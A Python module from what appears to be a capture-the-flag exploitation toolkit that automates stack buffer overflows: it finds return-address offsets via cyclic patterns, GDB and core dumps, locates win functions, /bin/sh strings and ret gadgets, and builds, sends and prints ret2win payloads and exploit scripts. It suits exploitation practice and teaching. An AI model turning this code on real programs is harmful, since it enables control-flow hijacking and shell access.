"""
Automatic buffer overflow offset discovery.

Provides multiple methods for finding the exact offset to overwrite
the return address in buffer overflow vulnerabilities:
- GDB-based analysis (most accurate)
- Core dump analysis
- Binary search with crash detection
- De Bruijn cyclic pattern generation and finding
"""

import os
import re
import signal
import struct
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, Dict, List, Callable

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class OffsetResult:
    """Result of offset discovery."""
    offset: Optional[int] = None
    crash_address: Optional[int] = None
    pattern_found: str = ""
    method: str = ""
    register_values: Dict[str, int] = field(default_factory=dict)
    stack_data: bytes = b""
    success: bool = False
    error: str = ""

    # Additional info
    canary_offset: Optional[int] = None
    rbp_offset: Optional[int] = None

    def __str__(self) -> str:
        if self.success:
            result = f"Offset: {self.offset} (0x{self.offset:x}) - {self.method}"
            if self.rbp_offset:
                result += f"\nRBP offset: {self.rbp_offset}"
            if self.canary_offset:
                result += f"\nCanary offset: {self.canary_offset}"
            return result
        return f"Failed: {self.error}"

    def to_dict(self) -> dict:
        return {
            "offset": self.offset,
            "crash_address": hex(self.crash_address) if self.crash_address else None,
            "method": self.method,
            "success": self.success,
            "error": self.error,
            "rbp_offset": self.rbp_offset,
            "canary_offset": self.canary_offset,
            "register_values": {k: hex(v) for k, v in self.register_values.items()},
        }


class PatternGenerator:
    """Generate and find de Bruijn sequences for offset discovery."""

    def __init__(self):
        # Default alphabet matching pwntools
        self.alphabet = "abcdefghijklmnopqrstuvwxyz"

    def generate(self, length: int, n: int = 4) -> bytes:
        """
        Generate cyclic pattern of given length.

        Uses de Bruijn sequence - every n-character substring is unique.
        Compatible with pwntools cyclic().

        Args:
            length: Pattern length
            n: Subsequence length (4 for patterns up to ~26^4 = 456976)

        Returns:
            Cyclic pattern as bytes
        """
        try:
            from pwn import cyclic
            return cyclic(length, n=n)
        except ImportError:
            return self._generate_debruijn(length, n)

    def find(self, data: bytes | int, n: int = 4) -> int:
        """
        Find offset of data in cyclic pattern.

        Args:
            data: Bytes or integer to find
            n: Subsequence length

        Returns:
            Offset in pattern, or -1 if not found
        """
        try:
            from pwn import cyclic_find
            return cyclic_find(data, n=n)
        except ImportError:
            return self._find_in_debruijn(data, n)

    def _generate_debruijn(self, length: int, n: int = 4) -> bytes:
        """Generate de Bruijn sequence without pwntools."""
        k = len(self.alphabet)
        a = [0] * k * n
        sequence = []

        def db(t, p):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)

        db(1, 1)

        result = bytes([ord(self.alphabet[i % k]) for i in sequence])

        # Extend if needed
        while len(result) < length:
            result = result + result

        return result[:length]

    def _find_in_debruijn(self, data: bytes | int, n: int = 4) -> int:
        """Find offset without pwntools."""
        if isinstance(data, int):
            # Convert integer to bytes (little endian)
            byte_len = 8 if data > 0xFFFFFFFF else 4
            data = data.to_bytes(byte_len, 'little').rstrip(b'\x00')
            if len(data) < n:
                data = data.ljust(n, b'\x00')

        # Generate pattern long enough
        pattern = self._generate_debruijn(max(20000, len(data) * 1000), n)

        # Try to find the exact sequence
        idx = pattern.find(data[:n])
        if idx != -1:
            return idx

        # Try reversed for big endian
        idx = pattern.find(data[:n][::-1])
        if idx != -1:
            return idx

        return -1


class OffsetFinder:
    """Automatic offset discovery using multiple methods."""

    def __init__(self, binary_path: str | Path, bits: int = 64):
        """
        Initialize offset finder.

        Args:
            binary_path: Path to target binary
            bits: Binary architecture (32 or 64)
        """
        self.binary_path = Path(binary_path)
        self.bits = bits
        self.word_size = bits // 8
        self.pattern_gen = PatternGenerator()
        self._gdb_available = self._check_gdb()

    def _check_gdb(self) -> bool:
        """Check if GDB is available."""
        try:
            result = subprocess.run(
                ["gdb", "--version"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    def find_offset(
        self,
        max_length: int = 2048,
        input_method: str = "stdin",
        args: List[str] = None,
    ) -> OffsetResult:
        """
        Find buffer overflow offset using best available method.

        Args:
            max_length: Maximum pattern length to try
            input_method: "stdin", "argv", or "file"
            args: Additional arguments for the binary

        Returns:
            OffsetResult with discovered offset
        """
        args = args or []

        # Try GDB method first (most accurate)
        if self._gdb_available:
            logger.info("Attempting offset discovery with GDB...")
            result = self._find_with_gdb(max_length, input_method, args)
            if result.success:
                return result
            logger.debug(f"GDB method failed: {result.error}")

        # Try core dump method
        logger.info("Attempting offset discovery with core dumps...")
        result = self._find_with_coredump(max_length, input_method, args)
        if result.success:
            return result
        logger.debug(f"Core dump method failed: {result.error}")

        # Try binary search method
        logger.info("Attempting offset discovery with binary search...")
        result = self._find_with_binary_search(max_length, input_method, args)
        if result.success:
            return result

        return OffsetResult(
            success=False,
            error="Could not determine offset with any method",
        )

    def _find_with_gdb(
        self,
        max_length: int,
        input_method: str,
        args: List[str],
    ) -> OffsetResult:
        """Find offset using GDB."""
        pattern = self.pattern_gen.generate(max_length, n=self.word_size)

        # Create temporary files
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pattern') as f:
            f.write(pattern)
            pattern_path = f.name

        # Build GDB script
        gdb_script = """
set pagination off
set confirm off
set disassembly-flavor intel
handle SIGSEGV stop print nopass
handle SIGBUS stop print nopass
handle SIGILL stop print nopass
handle SIGABRT stop print nopass
"""

        if input_method == "stdin":
            gdb_script += f"run {' '.join(args)} < {pattern_path}\n"
        elif input_method == "argv":
            gdb_script += f'run "$(cat {pattern_path})" {" ".join(args)}\n'
        else:
            gdb_script += f"run {pattern_path} {' '.join(args)}\n"

        gdb_script += """
info registers
x/16gx $rsp
bt
quit
"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
            f.write(gdb_script)
            script_path = f.name

        try:
            result = subprocess.run(
                ["gdb", "-q", "-x", script_path, str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=30,
            )

            output = result.stdout + result.stderr

            # Check if crash occurred
            if "SIGSEGV" not in output and "SIGBUS" not in output and "SIGABRT" not in output:
                return OffsetResult(success=False, error="No crash detected with pattern")

            # Parse register values
            registers = self._parse_gdb_registers(output)

            # Try to find offset from RIP/EIP (instruction pointer)
            for reg in ['rip', 'eip', 'pc']:
                if reg in registers:
                    value = registers[reg]
                    offset = self.pattern_gen.find(value, n=self.word_size)
                    if offset >= 0:
                        return OffsetResult(
                            offset=offset,
                            crash_address=value,
                            method=f"GDB - {reg.upper()} overwrite",
                            register_values=registers,
                            success=True,
                            rbp_offset=offset - self.word_size if offset >= self.word_size else None,
                        )

            # Try stack pointer - value at RSP might be our pattern
            stack_values = self._parse_stack_from_gdb(output)
            for i, value in enumerate(stack_values):
                offset = self.pattern_gen.find(value, n=self.word_size)
                if offset >= 0:
                    return OffsetResult(
                        offset=offset,
                        crash_address=value,
                        method=f"GDB - stack value at RSP+{i*self.word_size}",
                        register_values=registers,
                        success=True,
                    )

            # Try RBP if it was overwritten
            if 'rbp' in registers:
                offset = self.pattern_gen.find(registers['rbp'], n=self.word_size)
                if offset >= 0:
                    return OffsetResult(
                        offset=offset + self.word_size,  # RIP is after RBP
                        crash_address=registers['rbp'],
                        method="GDB - RBP overwrite (RIP = RBP offset + 8)",
                        register_values=registers,
                        success=True,
                        rbp_offset=offset,
                    )

            return OffsetResult(
                success=False,
                error="Pattern not found in crash registers",
                register_values=registers,
            )

        except subprocess.TimeoutExpired:
            return OffsetResult(success=False, error="GDB timeout - binary may hang")
        except Exception as e:
            return OffsetResult(success=False, error=f"GDB error: {e}")
        finally:
            try:
                os.unlink(pattern_path)
                os.unlink(script_path)
            except Exception:
                pass

    def _parse_gdb_registers(self, output: str) -> Dict[str, int]:
        """Parse register values from GDB output."""
        registers = {}

        # Match patterns like: rax            0x4141414141414141   4702111234474983745
        patterns = [
            r'(r[a-z0-9]+)\s+0x([0-9a-f]+)',  # 64-bit registers
            r'(e[a-z]+)\s+0x([0-9a-f]+)',      # 32-bit registers
            r'(rip|eip|pc)\s+0x([0-9a-f]+)',   # Instruction pointer
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, output, re.IGNORECASE):
                reg_name = match.group(1).lower()
                try:
                    reg_value = int(match.group(2), 16)
                    registers[reg_name] = reg_value
                except ValueError:
                    continue

        return registers

    def _parse_stack_from_gdb(self, output: str) -> List[int]:
        """Parse stack values from GDB x/16gx $rsp output."""
        values = []

        # Match lines like: 0x7fffffffe000:	0x6161616261616161	0x6161616461616163
        for match in re.finditer(r'0x[0-9a-f]+:\s+(0x[0-9a-f]+)', output, re.IGNORECASE):
            try:
                values.append(int(match.group(1), 16))
            except ValueError:
                continue

        return values

    def _find_with_coredump(
        self,
        max_length: int,
        input_method: str,
        args: List[str],
    ) -> OffsetResult:
        """Find offset using core dump analysis."""
        pattern = self.pattern_gen.generate(max_length, n=self.word_size)

        with tempfile.TemporaryDirectory() as tmpdir:
            # Try to enable core dumps
            core_pattern_file = Path("/proc/sys/kernel/core_pattern")

            try:
                if input_method == "stdin":
                    proc = subprocess.run(
                        [str(self.binary_path)] + args,
                        input=pattern,
                        capture_output=True,
                        timeout=10,
                        cwd=tmpdir,
                    )
                elif input_method == "argv":
                    proc = subprocess.run(
                        [str(self.binary_path), pattern.decode('latin-1')] + args,
                        capture_output=True,
                        timeout=10,
                        cwd=tmpdir,
                    )
                else:
                    pattern_file = Path(tmpdir) / "pattern.txt"
                    pattern_file.write_bytes(pattern)
                    proc = subprocess.run(
                        [str(self.binary_path), str(pattern_file)] + args,
                        capture_output=True,
                        timeout=10,
                        cwd=tmpdir,
                    )

                # Check for segfault
                if proc.returncode not in [-11, -6, -4, 139, 134, 132]:
                    return OffsetResult(success=False, error=f"No crash (exit code: {proc.returncode})")

                # Look for core dump
                core_files = list(Path(tmpdir).glob("core*"))
                if not core_files:
                    core_files = list(Path(".").glob("core*"))
                if not core_files:
                    core_files = list(Path("/tmp").glob("core*"))

                if core_files and self._gdb_available:
                    return self._analyze_core(core_files[0], pattern)

                return OffsetResult(success=False, error="No core dump found")

            except subprocess.TimeoutExpired:
                return OffsetResult(success=False, error="Process timeout")
            except Exception as e:
                return OffsetResult(success=False, error=f"Error: {e}")

    def _analyze_core(self, core_path: Path, pattern: bytes) -> OffsetResult:
        """Analyze core dump with GDB."""
        gdb_script = """
set pagination off
info registers
bt
quit
"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
            f.write(gdb_script)
            script_path = f.name

        try:
            result = subprocess.run(
                ["gdb", "-q", "-x", script_path, str(self.binary_path), str(core_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            registers = self._parse_gdb_registers(result.stdout)

            for reg in ['rip', 'eip', 'pc', 'rbp', 'ebp']:
                if reg in registers:
                    offset = self.pattern_gen.find(registers[reg], n=self.word_size)
                    if offset >= 0:
                        # Adjust for RIP vs RBP
                        if reg in ['rbp', 'ebp']:
                            offset += self.word_size
                        return OffsetResult(
                            offset=offset,
                            crash_address=registers[reg],
                            method=f"Core dump - {reg.upper()}",
                            register_values=registers,
                            success=True,
                        )

            return OffsetResult(
                success=False,
                error="Pattern not found in core",
                register_values=registers,
            )
        finally:
            os.unlink(script_path)

    def _find_with_binary_search(
        self,
        max_length: int,
        input_method: str,
        args: List[str],
    ) -> OffsetResult:
        """Find approximate offset using binary search."""

        def test_crash(length: int) -> bool:
            payload = b"A" * length
            try:
                if input_method == "stdin":
                    proc = subprocess.run(
                        [str(self.binary_path)] + args,
                        input=payload,
                        capture_output=True,
                        timeout=5,
                    )
                else:
                    proc = subprocess.run(
                        [str(self.binary_path), payload.decode('latin-1')] + args,
                        capture_output=True,
                        timeout=5,
                    )
                return proc.returncode in [-11, -6, -4, 139, 134, 132]
            except Exception:
                return False

        # Binary search for crash threshold
        low, high = 0, max_length
        crash_at = None

        while low < high:
            mid = (low + high) // 2
            if test_crash(mid):
                crash_at = mid
                high = mid
            else:
                low = mid + 1

        if crash_at is None:
            return OffsetResult(success=False, error="No crash detected at any length")

        # Refine with pattern around crash point
        start = max(0, crash_at - 100)
        pattern = self.pattern_gen.generate(200, n=self.word_size)

        for offset_guess in range(start, crash_at + 50, self.word_size):
            test_payload = b"A" * offset_guess + pattern[:self.word_size * 2]

            if input_method == "stdin":
                proc = subprocess.run(
                    [str(self.binary_path)] + args,
                    input=test_payload,
                    capture_output=True,
                    timeout=5,
                )
            else:
                proc = subprocess.run(
                    [str(self.binary_path), test_payload.decode('latin-1')] + args,
                    capture_output=True,
                    timeout=5,
                )

            if proc.returncode in [-11, -6, -4, 139, 134, 132]:
                return OffsetResult(
                    offset=offset_guess,
                    method="Binary search (approximate)",
                    success=True,
                )

        return OffsetResult(
            offset=crash_at,
            method="Binary search (crash threshold)",
            success=True,
        )

    # === Convenience Methods ===

    def find_ret_offset(self, max_length: int = 2048) -> Optional[int]:
        """Find offset to return address."""
        result = self.find_offset(max_length)
        return result.offset if result.success else None

    def find_canary_offset(self, ret_offset: int) -> int:
        """
        Calculate canary offset from return address offset.

        On x64: stack layout is [buffer][canary][saved_rbp][return_addr]
        Canary is typically at ret_offset - 16
        """
        return ret_offset - (2 * self.word_size)

    def find_rbp_offset(self, ret_offset: int) -> int:
        """Calculate saved RBP offset from return address offset."""
        return ret_offset - self.word_size


# === Convenience Functions ===

def cyclic(length: int) -> bytes:
    """Generate cyclic pattern (compatible with pwntools)."""
    return PatternGenerator().generate(length)


def cyclic_find(data: bytes | int) -> int:
    """Find offset in cyclic pattern (compatible with pwntools)."""
    return PatternGenerator().find(data)


def find_offset(
    binary_path: str | Path,
    max_length: int = 2048,
    input_method: str = "stdin",
    bits: int = 64,
) -> Optional[int]:
    """Convenience function to find buffer overflow offset."""
    finder = OffsetFinder(binary_path, bits)
    result = finder.find_offset(max_length, input_method)
    return result.offset if result.success else None


class InteractiveOffsetFinder:
    """
    Find offset for binaries that require interaction (prompts, menus).

    Handles binaries that print prompts before accepting input.
    """

    def __init__(self, binary_path: str, bits: int = 64, timeout: float = 2.0):
        self.binary_path = Path(binary_path)
        self.bits = bits
        self.word_size = bits // 8
        self.timeout = timeout
        self.pattern_gen = PatternGenerator()

    def find_offset_with_pwntools(self, max_length: int = 500) -> OffsetResult:
        """
        Find offset using pwntools process with proper prompt handling.

        Args:
            max_length: Maximum pattern length

        Returns:
            OffsetResult
        """
        try:
            from pwn import process, context, cyclic, cyclic_find
            context.log_level = 'error'
        except ImportError:
            return OffsetResult(success=False, error="pwntools not available")

        pattern = cyclic(max_length, n=self.word_size)

        try:
            p = process(str(self.binary_path))

            # Wait for and consume any prompt
            try:
                prompt = p.recv(timeout=self.timeout)
                logger.debug(f"Received prompt: {prompt[:50]}...")
            except:
                pass

            # Send pattern
            p.sendline(pattern)

            # Wait for crash
            try:
                p.wait(timeout=self.timeout)
            except:
                pass

            # Analyze core dump
            try:
                core = p.corefile
                if core:
                    # Get crash address
                    crash_addr = core.rip if self.bits == 64 else core.eip

                    # Try to find in pattern
                    offset = cyclic_find(crash_addr, n=self.word_size)
                    if offset >= 0:
                        p.close()
                        return OffsetResult(
                            offset=offset,
                            crash_address=crash_addr,
                            method="pwntools_interactive",
                            success=True,
                        )

                    # Try RSP value
                    rsp_val = core.rsp
                    # Read value at RSP (potential return address)
                    try:
                        ret_val = core.read(rsp_val, self.word_size)
                        ret_int = int.from_bytes(ret_val, 'little')
                        offset = cyclic_find(ret_int, n=self.word_size)
                        if offset >= 0:
                            p.close()
                            return OffsetResult(
                                offset=offset,
                                crash_address=ret_int,
                                method="pwntools_interactive (RSP)",
                                success=True,
                            )
                    except:
                        pass
            except Exception as e:
                logger.debug(f"Core analysis failed: {e}")

            p.close()

        except Exception as e:
            logger.debug(f"Interactive method failed: {e}")
            return OffsetResult(success=False, error=str(e))

        return OffsetResult(success=False, error="Could not find pattern in crash")

    def find_offset_bruteforce(
        self,
        min_offset: int = 8,
        max_offset: int = 300,
        step: int = 8,
        target_addr: Optional[int] = None,
    ) -> OffsetResult:
        """
        Brute force offset by testing different values.

        Args:
            min_offset: Minimum offset to try
            max_offset: Maximum offset to try
            step: Step size
            target_addr: Optional target address to jump to (for verification)

        Returns:
            OffsetResult with found offset
        """
        try:
            from pwn import process, p64, p32, context
            context.log_level = 'error'
        except ImportError:
            return OffsetResult(success=False, error="pwntools not available")

        pack = p64 if self.bits == 64 else p32

        # If we have a target, test if we can reach it
        if target_addr:
            for offset in range(min_offset, max_offset, step):
                try:
                    p = process(str(self.binary_path))

                    # Receive prompt
                    try:
                        p.recv(timeout=0.5)
                    except:
                        pass

                    # Send payload with ret gadget for alignment + target
                    # Find ret gadget first
                    ret_gadget = self._find_ret_gadget()

                    if ret_gadget:
                        payload = b'A' * offset + pack(ret_gadget) + pack(target_addr)
                    else:
                        payload = b'A' * offset + pack(target_addr)

                    p.sendline(payload)

                    # Check output for success indicators
                    try:
                        output = p.recvall(timeout=1)
                        if any(x in output.lower() for x in [b'shell', b'flag', b'success', b'win', b'/bin']):
                            p.close()
                            return OffsetResult(
                                offset=offset,
                                method="bruteforce_verified",
                                success=True,
                            )
                    except:
                        pass

                    p.close()

                except Exception:
                    continue

        # Fall back to crash detection
        return self._find_crash_offset(min_offset, max_offset, step)

    def _find_crash_offset(self, min_off: int, max_off: int, step: int) -> OffsetResult:
        """Find offset where crash behavior changes."""
        try:
            from pwn import process, context
            context.log_level = 'error'
        except ImportError:
            return OffsetResult(success=False, error="pwntools not available")

        # Find first offset that causes a crash
        crash_offset = None

        for offset in range(min_off, max_off, step):
            try:
                p = process(str(self.binary_path))
                try:
                    p.recv(timeout=0.3)
                except:
                    pass

                p.sendline(b'A' * offset)

                try:
                    p.wait(timeout=0.5)
                    # Check if crashed (exit code -11 = SIGSEGV)
                    if p.poll() in [-11, -6, 139, 134]:
                        if crash_offset is None:
                            crash_offset = offset
                except:
                    pass

                p.close()

            except:
                continue

        if crash_offset:
            # Refine to exact offset
            for fine_offset in range(max(8, crash_offset - step), crash_offset + step):
                try:
                    p = process(str(self.binary_path))
                    try:
                        p.recv(timeout=0.3)
                    except:
                        pass

                    p.sendline(b'A' * fine_offset)

                    try:
                        p.wait(timeout=0.5)
                        if p.poll() in [-11, -6, 139, 134]:
                            p.close()
                            return OffsetResult(
                                offset=fine_offset,
                                method="crash_detection",
                                success=True,
                            )
                    except:
                        pass

                    p.close()
                except:
                    continue

        return OffsetResult(success=False, error="No crash detected")

    def _find_ret_gadget(self) -> Optional[int]:
        """Find a simple ret gadget for stack alignment."""
        try:
            result = subprocess.run(
                ["objdump", "-d", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            for line in result.stdout.split('\n'):
                # Look for: addr: c3   ret
                if '\tc3' in line.lower() and 'ret' in line.lower():
                    match = re.match(r'\s*([0-9a-f]+):', line)
                    if match:
                        return int(match.group(1), 16)
        except:
            pass

        return None


class WinFunctionFinder:
    """
    Find potential win functions in a binary.

    Analyzes functions to find those that:
    - Call system() or execve()
    - Access /bin/sh string
    - Are named suspiciously
    """

    WIN_NAMES = [
        "win", "flag", "shell", "get_flag", "print_flag", "read_flag",
        "give_shell", "spawn_shell", "backdoor", "secret", "winner",
        "cat_flag", "system_shell", "ez_win", "vuln_func", "getshell",
        "not_called", "hidden", "unused", "unreachable", "debug",
        "pwn", "hack", "exploit", "target", "goal", "ret2win",
    ]

    def __init__(self, binary_path: str):
        self.binary_path = Path(binary_path)

    def find_all(self) -> List[tuple]:
        """Find all potential win functions."""
        results = []

        # By name
        results.extend(self._find_by_name())

        # By behavior (calls system/execve)
        results.extend(self._find_by_calls())

        # Deduplicate
        seen = set()
        unique = []
        for name, addr in results:
            if addr not in seen:
                seen.add(addr)
                unique.append((name, addr))

        return unique

    def _find_by_name(self) -> List[tuple]:
        """Find functions with suspicious names."""
        results = []

        try:
            output = subprocess.run(
                ["nm", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            for line in output.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3:
                    addr_str, sym_type, name = parts[0], parts[1], parts[2]

                    if sym_type.upper() in ['T', 't']:
                        name_lower = name.lower()
                        for pattern in self.WIN_NAMES:
                            if pattern in name_lower:
                                addr = int(addr_str, 16)
                                results.append((name, addr))
                                break
        except Exception as e:
            logger.debug(f"Name search failed: {e}")

        return results

    def _find_by_calls(self) -> List[tuple]:
        """Find functions that call system/execve."""
        results = []

        # Functions to exclude (calling these doesn't help)
        EXCLUDE_FUNCS = {'main', '__libc_start_main', '_start', 'init', 'fini'}

        try:
            output = subprocess.run(
                ["objdump", "-d", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            current_func = None
            current_addr = 0
            calls_system = False

            for line in output.stdout.split('\n'):
                # New function
                func_match = re.match(r'^([0-9a-f]+)\s+<([^>]+)>:', line)
                if func_match:
                    if current_func and calls_system:
                        if '@' not in current_func and not current_func.startswith('_'):
                            if current_func not in EXCLUDE_FUNCS:
                                results.append((current_func, current_addr))

                    current_func = func_match.group(2)
                    current_addr = int(func_match.group(1), 16)
                    calls_system = False
                    continue

                if current_func:
                    if any(x in line for x in ['system@plt', 'execve@plt', '<system>', '<execve>']):
                        calls_system = True

            # Last function
            if current_func and calls_system:
                if '@' not in current_func and not current_func.startswith('_'):
                    if current_func not in EXCLUDE_FUNCS:
                        results.append((current_func, current_addr))

        except Exception as e:
            logger.debug(f"Call analysis failed: {e}")

        return results


class QuickExploit:
    """
    Quick exploitation helper - combines offset finding and exploitation.

    Usage:
        qe = QuickExploit("./vuln")
        if qe.analyze():
            qe.exploit()  # or qe.get_payload()
    """

    def __init__(self, binary_path: str, bits: int = 64):
        self.binary_path = Path(binary_path)
        self.bits = bits
        self.word_size = bits // 8

        self.offset = None
        self.win_funcs = []
        self.ret_gadget = None
        self.binsh_addr = None

    def analyze(self) -> bool:
        """
        Analyze binary for exploitation.

        Returns:
            True if exploitation is possible
        """
        logger.info(f"Analyzing {self.binary_path.name}...")

        # Find offset
        finder = InteractiveOffsetFinder(str(self.binary_path), self.bits)
        result = finder.find_offset_with_pwntools()
        if result.success:
            self.offset = result.offset
            logger.info(f"Found offset: {self.offset}")
        else:
            # Try binary analysis
            of = OffsetFinder(str(self.binary_path), self.bits)
            result = of._find_from_binary() if hasattr(of, '_find_from_binary') else of.find_offset()
            if result.success:
                self.offset = result.offset
                logger.info(f"Found offset from binary: {self.offset}")

        # Find win functions
        wf = WinFunctionFinder(str(self.binary_path))
        self.win_funcs = wf.find_all()
        if self.win_funcs:
            logger.info(f"Found win functions: {self.win_funcs}")

        # Find ret gadget
        self.ret_gadget = self._find_ret()

        # Find /bin/sh
        self.binsh_addr = self._find_binsh()

        return self.offset is not None and len(self.win_funcs) > 0

    def _find_ret(self) -> Optional[int]:
        """Find ret gadget."""
        try:
            result = subprocess.run(
                ["objdump", "-d", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            for line in result.stdout.split('\n'):
                if '\tc3' in line.lower() and 'ret' in line.lower():
                    match = re.match(r'\s*([0-9a-f]+):', line)
                    if match:
                        return int(match.group(1), 16)
        except:
            pass
        return None

    def _find_binsh(self) -> Optional[int]:
        """Find /bin/sh string."""
        try:
            from pwn import ELF
            elf = ELF(str(self.binary_path), checksec=False)
            return next(elf.search(b"/bin/sh"), None)
        except:
            pass
        return None

    def get_payload(self) -> bytes:
        """
        Generate exploitation payload.

        Returns:
            Payload bytes
        """
        if not self.offset or not self.win_funcs:
            raise ValueError("Must call analyze() first and find offset + win function")

        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        win_addr = self.win_funcs[0][1]

        payload = b'A' * self.offset

        # Add ret gadget for stack alignment on x64
        if self.bits == 64 and self.ret_gadget:
            payload += pack(self.ret_gadget)

        payload += pack(win_addr)

        return payload

    def exploit(self, interactive: bool = True) -> bool:
        """
        Attempt exploitation.

        Args:
            interactive: Drop into interactive shell if successful

        Returns:
            True if successful
        """
        try:
            from pwn import process, context
            context.log_level = 'info'
        except ImportError:
            logger.error("pwntools required for exploitation")
            return False

        payload = self.get_payload()

        logger.info(f"Sending payload (offset={self.offset}, target={hex(self.win_funcs[0][1])})")

        p = process(str(self.binary_path))

        # Receive prompt
        try:
            prompt = p.recv(timeout=1)
            logger.debug(f"Prompt: {prompt}")
        except:
            pass

        p.sendline(payload)

        if interactive:
            try:
                p.interactive()
            except:
                pass
        else:
            try:
                output = p.recvall(timeout=2)
                logger.info(f"Output: {output}")
                return any(x in output.lower() for x in [b'shell', b'flag', b'/bin'])
            except:
                pass

        return True

    def print_exploit_script(self):
        """Print a complete exploit script."""
        if not self.offset or not self.win_funcs:
            print("# Run analyze() first!")
            return

        win_name, win_addr = self.win_funcs[0]

        script = f'''#!/usr/bin/env python3
from pwn import *

# Target binary
binary = "{self.binary_path}"
elf = ELF(binary, checksec=False)

# Offset to return address
offset = {self.offset}

# Win function
{win_name} = {hex(win_addr)}
'''

        if self.ret_gadget:
            script += f'''
# Ret gadget for stack alignment
ret = {hex(self.ret_gadget)}
'''

        script += f'''
# Build payload
payload = b'A' * offset
'''

        if self.bits == 64 and self.ret_gadget:
            script += f'''payload += p64(ret)  # Stack alignment
'''

        script += f'''payload += p{self.bits}({win_name})

# Exploit
p = process(binary)
p.recvuntil(b"> ")  # Adjust prompt as needed
p.sendline(payload)
p.interactive()
'''
        print(script)


def quick_pwn(binary_path: str) -> Optional[bytes]:
    """
    Quick one-liner to analyze and generate exploit payload.

    Args:
        binary_path: Path to target binary

    Returns:
        Exploit payload or None
    """
    qe = QuickExploit(binary_path)
    if qe.analyze():
        return qe.get_payload()
    return None
